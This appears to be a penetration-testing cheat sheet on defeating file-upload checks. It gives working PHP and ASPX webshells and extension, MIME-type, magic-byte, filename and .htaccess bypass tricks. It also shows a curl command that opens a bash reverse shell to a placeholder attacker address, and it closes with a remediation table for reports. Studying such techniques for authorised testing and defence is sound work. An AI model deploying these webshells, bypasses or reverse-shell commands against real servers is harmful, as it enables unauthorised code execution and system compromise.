# File Upload Bypass

## Why It Matters

If you can upload a file that executes server-side code, you get RCE. The app might block you based on file extension, MIME type, or content — you need to bypass those checks.

**Goal:** Upload a webshell (PHP, ASPX, JSP) that executes when you browse to it.

---

## Basic Webshells

```php
<?php system($_GET['cmd']); ?>
```

```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>
```

Save as `shell.php` or `shell.aspx`, then browse to:
```
http://target/uploads/shell.php?cmd=whoami
```

---

## Extension Bypasses

If the app blocks `.php`, try alternate extensions that the server might still execute:

```
# PHP alternatives
.php3 .php4 .php5 .php7 .phtml .pht .phps .php%00.jpg

# ASPX alternatives  
.aspx .asp .asa .asax .ashx .asmx .cer .shtml

# Double extension (app checks last, server uses first)
shell.php.jpg
shell.php%00.jpg    # null byte truncation (older PHP)
shell.jpg.php       # if server executes based on first ext
```

---

## MIME Type Bypass

The app may check `Content-Type` header, not the file itself. Change it in Burp:

```
# Normal PHP upload blocked:
Content-Type: application/x-php

# Change to:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

Intercept the upload request in Burp Repeater → change Content-Type → forward.

---

## Magic Bytes Bypass

Some apps check file contents (magic bytes) instead of extension/MIME. Add image magic bytes to the start of your PHP:

```sh
# Add GIF magic bytes before PHP code
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php

# Or: PNG header
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php
```

---

## Filename Tricks

```
# Null byte (old PHP — truncates at null)
shell.php%00.jpg

# Path traversal in filename (write outside uploads dir)
../shell.php
..%2fshell.php
....//shell.php

# Case sensitivity (Windows servers)
shell.PHP
shell.Php
```

---

## If Only Images Allowed — Image With Embedded PHP

```sh
# Add PHP code to image metadata (exiftool)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Rename to trigger PHP execution
mv image.jpg shell.php.jpg
```

---

## Finding Where the File Goes

After upload you need to know the path to browse to it:

```sh
# Check the response — often shows the path
# Check the page source after upload
# Gobuster the /uploads/ directory
gobuster dir -u http://target/uploads/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Common upload paths to check
/uploads/
/upload/
/files/
/images/
/static/
/media/
/assets/
```

---

## Using the Webshell

```sh
# Execute command via browser
http://target/uploads/shell.php?cmd=whoami

# Or with curl
curl "http://target/uploads/shell.php?cmd=whoami"
curl "http://target/uploads/shell.php?cmd=id;hostname;ifconfig"

# Get a reverse shell
# Start listener: nc -lvnp 4444
curl "http://target/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/<KALI-IP>/4444+0>%261"
```

---

## .htaccess Trick (Apache)

If you can upload a `.htaccess` file, you can make the server execute your file as PHP:

```
# Upload this as .htaccess
AddType application/x-httpd-php .jpg

# Now upload shell.jpg — it executes as PHP
# Browse to /uploads/shell.jpg?cmd=whoami
```

---

## Remediation

**Root cause:** The application validates files based on unreliable signals (extension, Content-Type header, magic bytes) that an attacker controls. The validation happens at the wrong layer — the check should be on what the server will DO with the file, not what the file claims to be.

| Finding | Remediation |
|---|---|
| Server executes uploaded files | **Never store uploaded files in a web-accessible directory.** Store uploads outside the web root (e.g., `/var/uploads/` not `/var/www/html/uploads/`). Serve them back via a download script. |
| Extension-based validation only | Extension checks are bypassable. If files must be in a web directory, configure the web server to **never execute files in the upload directory** — Apache: `php_engine off` in upload dir's `.htaccess`, or deny execution via server config. |
| `.htaccess` can be uploaded | Explicitly block `.htaccess` uploads. In Apache, set `AllowOverride None` on the uploads directory. |
| MIME type check only | MIME type comes from the `Content-Type` header which the attacker sets. **Do not trust it.** Validate file contents server-side using a file magic library (e.g., PHP `finfo`, Python `python-magic`). |
| Image uploads could contain PHP | For images: use a library to re-encode the image (GD / Pillow) before storing — this strips any embedded PHP from metadata or file data. |
| No size limit on uploads | Enforce file size limits to prevent DoS. Define allowed file types via allowlist and reject everything else. |

**Key point for reports:** The only reliable fix is storing uploaded files outside the web root with execution disabled. Extension/MIME/magic byte checks are all bypassable; they are defense-in-depth, not solutions.
